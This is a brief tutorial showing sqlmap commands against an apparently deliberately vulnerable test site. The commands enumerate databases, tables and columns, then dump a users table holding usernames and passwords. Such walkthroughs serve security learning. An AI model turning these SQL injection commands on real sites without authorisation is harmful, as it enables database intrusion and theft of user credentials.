Following query will determine whether or not the specified URL (the website) is vulnerable.

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " --dbs

When the above query executes successfully, it notifies you of the website's vulnerability and provides the names of the databases it includes.
The GET method is the vulnerability in my scenario.

following querry is to find the tables name of a specific Database

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {Database name} --tables  

he above query returns the names of the tables in the specified database.

We can easily access the columns and their data once we know the names of the tables.

The following query will work as a demonstration. In my case, I obtained the table names for the "users table" and tried to access the UNAME & PASS.

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} -T users --columns


following command is used to save table of database into .csv file extention

--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} --dump -T users
